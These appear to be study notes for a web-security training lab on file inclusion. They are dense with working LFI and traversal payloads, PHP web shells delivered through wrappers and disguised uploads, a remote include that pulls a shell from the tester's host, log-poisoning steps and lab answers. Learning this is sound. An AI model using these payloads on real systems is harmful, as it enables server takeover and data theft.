
# Local File Inclusion (LFI)

LFI happens when a web application uses a user-controlled parameter as a **file path**. For example, if the URL is `?language=es.php`, the application may be loading `es.php` using something like `include($_GET['language'])`. If the parameter is vulnerable, change it to a known local file such as `/etc/passwd` and check whether its contents are returned.

```text
http://SERVER/index.php?language=/etc/passwd
```

If that works, the application has **LFI** and local files can be read through the parameter. If the application adds a directory before the input, such as `include("./languages/" . $_GET['language'])`, direct `/etc/passwd` may fail. Try **path traversal** with `../` to move back to the root directory:

```text
http://SERVER/index.php?language=../../../../etc/passwd
```

`../` means **go up one directory**. The exact number depends on the application location, but extra `../` can usually be used if the location is unknown. Also check whether the application adds something before or after the input. For example, `include("lang_" . $_GET['language'])` adds a **prefix**, while `include($_GET['language'] . ".php")` adds an **extension**. These can break a basic LFI payload, so first understand how the application builds the final file path before trying other techniques.

A **second-order LFI** is when the malicious value is stored first and used later by another feature. For example, instead of using a normal username such as `alice`, you might submit `/etc/passwd` as the username. If the application stores that value in the database and later uses the username to build a file path, the application may try to load `/etc/passwd`. The important flow is: **malicious input → stored → used later as a file path → LFI**. 

📂 Standard Location:

/
├── bin/
├── boot/
├── dev/
├── etc/        ← system-wide configuration files
├── home/
├── lib/
├── tmp/
├── usr/
└── var/

# File Inclusion Functions

| **Function**                   | **Read Content** | **Execute** | **Remote URL** |
| ------------------------------ | ---------------: | ----------: | -------------: |
| **PHP**                        |                  |             |                |
| `include()` / `include_once()` |              Yes |         Yes |            Yes |
| `require()` / `require_once()` |              Yes |         Yes |             No |
| `file_get_contents()`          |              Yes |          No |            Yes |
| `fopen()` / `file()`           |              Yes |          No |             No |
| **NodeJS**                     |                  |             |                |
| `fs.readFile()`                |              Yes |          No |             No |
| `fs.sendFile()`                |              Yes |          No |             No |
| `res.render()`                 |              Yes |         Yes |             No |
| **Java**                       |                  |             |                |
| `include`                      |              Yes |          No |             No |
| `import`                       |              Yes |         Yes |            Yes |
| **.NET**                       |                  |             |                |
| `@Html.Partial()`              |              Yes |          No |             No |
| `@Html.RemotePartial()`        |              Yes |          No |            Yes |
| `Response.WriteFile()`         |              Yes |          No |             No |
| `include`                      |              Yes |         Yes |            Yes |
# Local File Inclusion

| **Command / Payload**                                                                                | **Description**                                                                                                       |
| ---------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| **Basic LFI**                                                                                        |                                                                                                                       |
| `/index.php?language=/etc/passwd`                                                                    | Basic LFI                                                                                                             |
| `/index.php?language=../../../../etc/passwd`                                                         | LFI with path traversal                                                                                               |
| `/index.php?language=/../../../etc/passwd`                                                           | LFI with filename prefix                                                                                              |
| `/index.php?language=./languages/../../../../etc/passwd`                                             | LFI with approved path                                                                                                |
| **LFI Bypasses**                                                                                     |                                                                                                                       |
| `/index.php?language=....//....//....//....//etc/passwd`                                             | Bypass basic path traversal filter                                                                                    |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`             | Bypass filters with URL encoding                                                                                      |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]`    | Bypass appended extension with path truncation _(obsolete)_ (`./` basically means:**Stay in the current directory.**) |
| `echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done` | Automate the creation of this string 2048 times                                                                       |
| `/index.php?language=../../../../etc/passwd%00`                                                      | Bypass appended extension with null byte _(obsolete)_                                                                 |


# PHP Filters

PHP filters let us **modify file data** during an LFI attack.  
`resource` = the file we want to read, `read` = the filter we apply.  
`convert.base64-encode` lets us **read PHP source code instead of executing it**.  
First find PHP files with fuzzing, then use the Base64 filter to read their source and look for secrets.

| `/index.php?language=php://filter/read=convert.base64-encode/resource=configure` | Read PHP with base64 filter. `resource` = file/stream to apply the filter to.  <br>`read` = specifies the filter to apply. |
| -------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |

# Remote Code Execution

## LFI and PHP Wrappers

When we have **LFI in a PHP application**, PHP wrappers can sometimes turn file inclusion into **command execution**. The three important wrappers here are:

|Wrapper|What it does|Main requirement|
|---|---|---|
|`data://`|Includes PHP code supplied in the URL|`allow_url_include = On`|
|`php://input`|Includes PHP code supplied in POST data|`allow_url_include = On` + POST|
|`expect://`|Directly executes a system command|`expect` extension installed/enabled|

---

### 1. Check `allow_url_include`

Before trying `data://` or `php://input`, check whether: `allow_url_include = On` is enabled. The PHP configuration is usually located at:

```text
Apache → /etc/php/X.Y/apache2/php.ini
Nginx  → /etc/php/X.Y/fpm/php.ini
```

`X.Y` is the PHP version. Start with the likely/current version and try older versions if necessary. Because the `.ini` file is large, use the **Base64 filter** through the LFI:

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

Copy the Base64 output and decode it:

```bash
echo '<BASE64_OUTPUT>' | base64 -d | grep allow_url_include
```

If the result is: `allow_url_include = On`, then `data://` and `php://input` can potentially be used.  **Important:** `allow_url_include` is **Off by default**, but some applications may have it enabled.

---

### 2. `data://` Wrapper

The `data://` wrapper lets us include data directly through the URL, including PHP code. First create a simple PHP web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

Example output:

```text
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

The Base64 version is useful because it can safely be placed inside the `data://` wrapper. The basic structure is:

```text
data://text/plain;base64,<BASE64_PHP_CODE>
```

Then pass the command through:

```text
&cmd=id
```

Full request:

```text
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

Or with cURL:

```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

(**Short note**: if you want to point to a directory, do `ls+/` here after `&cmd=`,the `+` is decoded as a **space** in normal query-string parsing).

---

### 3. `php://input` Wrapper

`php://input` is similar to `data://`, but the PHP code is sent in the **POST request body** instead of being placed in the URL. It also requires:

```text
allow_url_include = On
```

Use:

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

The important parts are:

```text
POST body:
<?php system($_GET["cmd"]); ?>

GET parameter: cmd=id
```

Example output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

##### Important condition

The vulnerable parameter must accept **POST requests**. Also, using, `$_GET["cmd"]`, requires the application to accept the command through GET. If the application only accepts POST, the command can instead be written directly into the PHP code, for example: `<?php system('id'); ?>`


---

### 4. `expect://` Wrapper

The `expect://` wrapper is different because it is designed to **execute commands directly**. First check whether the PHP `expect` extension is configured. After obtaining the Base64-encoded `php.ini`, decode it and search for:

```bash
echo '<BASE64_OUTPUT>' | base64 -d | grep expect
```

If you see: `extension=expect`, the server is configured to load the extension. However, this **does not guarantee that it actually loaded successfully**. The best test is to use the wrapper directly:

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

If it works:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
---

# Section 6 - Remote File Inclusion (RFI)

Always check `allow_url_include` to be on for the protocols (ftp, http) used. If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. However, we must note that this technique is `more likely to work if we were on the same network`, specially for smb.

| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>`, or ftp, smb | Host web shell               |
| ----------------------------------------------------------------------------------------------------------- | ---------------------------- |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=cat+/exercise/flag.txt`                 | Include remote PHP web shell |

---
---

# Section 7 - LFI and File Uploads

## Option 1. GIF / Image Upload

| **Command / Payload**                                   | **Description**                                                                     |
| ------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Creates a malicious GIF containing PHP code.                                        |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | Includes the uploaded GIF file path through LFI and executes the embedded PHP code. |

**Idea:** Hide PHP code inside an image that the application allows us to upload.

---

## Option 2. ZIP Upload

|**Command / Payload**|**Description**|
|---|---|
|`echo '<?php system($_GET["cmd"]); ?>' > shell.php`|Creates the PHP web shell that will be placed inside the ZIP.|
|`zip shell.jpg shell.php`|Creates a ZIP archive containing `shell.php` and disguises it as a JPG.|
|`/index.php?language=zip://shell.zip%23shell.php&cmd=id`|Uses the `zip://` wrapper to access `shell.php` inside the archive through LFI.|

**Idea:** PHP shell → ZIP archive → upload → `zip://` → execute.

---

## Option 3. PHAR Upload

### Create the PHAR script

|**Command / Code**|**Description**|
|---|---|
|`<?php``$phar = new Phar('shell.phar');``$phar->startBuffering();``$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');``$phar->setStub('<?php __HALT_COMPILER(); ?>');``$phar->stopBuffering();``?>`|PHP script that creates a PHAR archive and places the PHP web shell inside it as `shell.txt`.|
### Compile and disguise it

|**Command**|**Description**|
|---|---|
|`php --define phar.readonly=0 shell.php`|Runs the script and creates `shell.phar`.|
|`mv shell.phar shell.jpg`|Renames the PHAR as `shell.jpg` so it can be uploaded as an image.|

### Include the PHAR

|**Payload**|**Description**|
|---|---|
|`/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`|Uses `phar://` to access `shell.txt` inside the uploaded PHAR and execute the PHP code.|

**Idea:** PHP shell → PHAR → disguise as image → upload → `phar://` → execute.


**Note:** There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the `phpinfo()` page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to [This Link](https://hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html).

---
---

# Section 8 - Log Poisoning


Log poisoning is an **LFI-to-RCE technique**. The basic idea is to put PHP code into something that the server writes to a file, such as a PHP session or web server log. If the LFI vulnerability can then include that file and the PHP function has **execution capability**, the PHP code inside the file can execute.

The important requirements are: **the application must be vulnerable to LFI, the PHP/web process must be able to read the poisoned file, and the included file must be processed by an execution-capable function such as ****`include()`**** or ****`require()`****.**

---

## 1. PHP Session Poisoning

PHP applications commonly use a `PHPSESSID` cookie to identify a user's session. PHP stores session data in a server-side session file. On Linux, a common location is:

```text
/var/lib/php/sessions/
```

On Windows, it is commonly:

```text
C:\Windows\Temp\
```

The session filename normally contains the `PHPSESSID` value with `sess_` added before it.

|**Cookie**|**Session File**|
|---|---|
|`PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd`|`/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`|

The important part is that the session ID is **different for every session**, so always use the `PHPSESSID` from the current target/session.

### Step 1 — Include the Session File

First, check whether the session file is readable through LFI.

|**Command / URL**|**Purpose**|
|---|---|
|`http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`|Includes the current PHP session file through the LFI vulnerability.|

If the contents are visible, check which session values can be controlled.

For example, the session may contain:

```text
page|s:7:"es.php";
preference|s:2:"en";
```

If `page` comes from the `language` parameter, then `page` may be controllable.

### Step 2 — Confirm Control

| **Command / URL**                                                                                    | **Purpose**                                                             |
| ---------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| `http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning`                                     | Changes the controlled session value to `session_poisoning`.            |
| `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Includes the session file again to check whether the value was stored.  |
|                                                                                                      |                                                                         |

If `session_poisoning` appears inside the session file, the value can be **poisoned**.

### Step 3 — Poison the Session With PHP

The next step is to put PHP code into the controlled session value.

| **Encoded Payload**                                                                                    | **Purpose**                                                      |
| ------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------- |
| `http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Stores `<?php system($_GET["cmd"]); ?>` inside the session data. |

The encoded value represents:

```php
<?php system($_GET["cmd"]); ?>
```

### Step 4 — Include the Poisoned Session

| **Command / URL**                                                                                           | **Purpose**                                                                                                                                        |
| ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| `http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | Includes the poisoned session file and executes `id`. This extracts the result using the previous session log where we included our `cmd` command. |

**Important:** The session file can be overwritten after it is included. Therefore, the session may need to be poisoned again before executing another command. A useful goal after gaining execution is to establish a more permanent foothold within the authorized lab environment rather than repeatedly poisoning the session.

---

## 2. Server Log Poisoning

Web servers such as **Apache** and **Nginx** record requests in log files. The important part for log poisoning is that some request fields are controlled by us. The **`User-Agent`**** header** is particularly useful because it is normally written into the access log. For example: User-Agent: Mozilla/5.0. If PHP code is placed in the `User-Agent`, that PHP code may become part of the log file. If the log can then be included through LFI, the PHP code may execute.

##### Common Log Locations

|**Server**|**Linux**|**Windows**|
|---|---|---|
|**Apache**|`/var/log/apache2/`|`C:\xampp\apache\logs\`|
|**Nginx**|`/var/log/nginx/`|`C:\nginx\log\`|

### Step 1 — Check Whether the Log Is Readable

|**Command / URL**|**Purpose**|
|---|---|
|`http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log`|Attempts to read the Apache access log through LFI.|

If the log contents are returned, check whether the `User-Agent` appears in the output.

**Important:** Apache logs are often restricted to privileged users, while Nginx logs may be readable by lower-privileged users depending on configuration. Always verify access instead of assuming the log is readable.

### Step 2 — Poison the User-Agent

The `User-Agent` can be changed with tools such as Burp Suite or cURL.

| **Command**                                                      | **Purpose**                                                                                                |
| ---------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison` | Creates a file containing a malicious `User-Agent` header.                                                 |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison`       | Sends the request with the malicious `User-Agent`, causing the PHP code to be written into the access log. |

The important idea is that **the request itself does not execute the PHP code**. It first places the PHP code into the log.

### Step 3 — Include the Poisoned Log

| **Command / URL**                                                                 | **Purpose**                                                                                |
| --------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id` | Includes the poisoned access log through LFI and causes the PHP code inside it to execute. |

The `cmd=id` parameter is then used by the log you previously sent:

```php
<?php system($_GET['cmd']); ?>
```

**Tip:** You do not need to poison the exact request containing the LFI payload. Any request to the web server is normally logged, so another harmless request can be used to place the PHP code into the log.

---

## 4. `/proc` as an Alternative

Linux process information is exposed through `/proc`. Because request information such as the `User-Agent` can appear in process environment data, some `/proc` files may provide another place to attempt poisoning.

|**File**|**Purpose**|
|---|---|
|`/proc/self/environ`|Contains environment variables of the current process.|
|`/proc/self/fd/N`|References an open file descriptor of the current process.|

For example:

|**LFI Payload**|**Purpose**|
|---|---|
|`/index.php?language=/proc/self/environ`|Attempts to include the current process's environment data.|
|`/index.php?language=/proc/self/fd/N`|Attempts to include a process file descriptor.|

`/proc` permissions vary, so these files may not be readable.

---

## 5. Other Log Poisoning Targets

The same concept can work with other services if two conditions are satisfied:

1. The service logs something that can be controlled.
2. The LFI vulnerability can read the resulting log.

|**Log**|**Possible Controlled Input**|
|---|---|
|`/var/log/sshd.log`|SSH username or other logged SSH input|
|`/var/log/mail`|Email content or sender-related fields|
|`/var/log/vsftpd.log`|FTP username or other logged FTP input|

For example, if an FTP server logs the username, a controlled username containing PHP code could potentially poison the FTP log. If the LFI can then include that log and the application executes PHP from it, the code may run.

## Questions

**Question 1:**

`/var/lib/php/sessions/sess_1gdq88m5bc5m36ds9e4tlnb667&cmd=pwd`

include your session id from cookies.

**Question 2:**

Try:

`http://IP:PORT/index.php?language=/var/lib/php/sessions/sess_1gdq88m5bc5m36ds9e4tlnb667&cmd=ls+/`

if you cant find anything,

then, poison the user agent and then,

`http://IP:PORT/index.php?language=/var/log/apache2/access.log&cmd=cat+/+/c85ee5082f4c723ace6c0796e3a3db09.txt`

---
---




# Section 9 -  Automated Scanning

|        | **Command / Resource**                                                                                                                                                               | **Description**                                                                                                                                                                                                                                                          |
| ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Step 1 | `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`                                      | Fuzz page parameters                                                                                                                                                                                                                                                     |
| Step 2 | `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path. Because webroot fuzzing finds the correct starting path before testing path traversal. **If you don't know the application's **webroot/path structure**, you may not know how many `../` are needed or what path the application is actually using.** |
| Step 3 | `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287`                                                      | Fuzz LFI payloads and find Path traversal.                                                                                                                                                                                                                               |
| Step 4 | `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`                                                                      | Fuzz server configurations                                                                                                                                                                                                                                               |
|        | [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)                                                                                                  | LFI wordlists                                                                                                                                                                                                                                                            |
|        | [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)                                                                                | LFI payload wordlist **(Good one)**                                                                                                                                                                                                                                      |
|        | [Linux webroot wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)                                          | Linux webroot paths                                                                                                                                                                                                                                                      |
|        | [Windows webroot wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)                                      | Windows webroot paths                                                                                                                                                                                                                                                    |
|        | [Linux server configuration wordlist](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)                                                         | Linux configuration paths                                                                                                                                                                                                                                                |
|        | [Windows server configuration wordlist](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)                                                     | Windows configuration paths                                                                                                                                                                                                                                              |
Exposed parameters may be vulnerable to any other vulnerability as well. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). But see if they are updated or not.
[File Inclusion/Path traversal - HackTricks](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters) 



[CPTS-Walkthrough/HTB-Academy/27. File Inclusion.md at main · buduboti/CPTS-Walkthrough](https://github.com/buduboti/CPTS-Walkthrough/blob/main/HTB-Academy/27.%20File%20Inclusion.md) 

[Skills Assessment | Hackervice](https://www.hackervice.com/ctf-labs/htb-certified-bug-bounty-hunter/file-inclusion/skills-assessment) 